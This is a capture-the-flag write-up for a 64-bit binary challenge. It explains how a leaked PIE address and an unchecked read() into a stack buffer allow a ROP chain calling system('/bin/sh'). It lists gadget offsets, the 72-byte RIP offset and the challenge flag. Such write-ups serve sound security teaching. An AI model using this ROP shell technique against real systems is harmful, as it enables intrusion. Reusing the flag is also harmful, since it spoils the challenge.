## Vulnerability Explanation

This 64-bit binary leaks a PIE address, then reads user input into a fixed-size stack buffer without proper bounds checking. By overflowing past the return pointer, we can build a ROP chain to call system("/bin/sh") and spawn a shell.

Key points:

- PIE (Position-Independent Executable): The program’s code is loaded at a random base address each run. It leaks main’s address so we can compute the base.
- Buffer overflow: No length check on read(), allowing us to overwrite RIP.

- ROP chain: We need gadgets to set up arguments (e.g., pop rdi ; ret) and then call system.

## Exploitation Steps

1- Leak PIE of the program, prints: Main at: 0x55...<address>

2- We parse this address (main_leak) and compute the base address:
`pie_base = main_leak - exe.sym.main`

3-Locate gadgets and symbols using offsets from the ELF:
Get gagdets with `ROPGadget --binary chall`
Get other offsets from ghidra, gdb or objdump

pop_rdi = pie_base + 0x116d # pop rdi; ret
ret = pie_base + 0x1016 # ret (stack alignment)
bin_sh = pie_base + 0x4030 # "/bin/sh" string
system = pie_base + exe.sym.system

3- Build ROP payload: Offset to RIP: 72 bytes (fills buffer + saved RBP).

4- Chain:
pop_rdi gadget → puts /bin/sh into rdi
ret gadget → align stack on some platforms
system function call

Trigger overflow then send the payload directly; when the function returns, it jumps into our ROP chain, invoking system("/bin/sh").

### Flag: ghctf{1_g3t_th0s3_g0os3bumps_3v3ryT1me_1_see_pop_rdi}
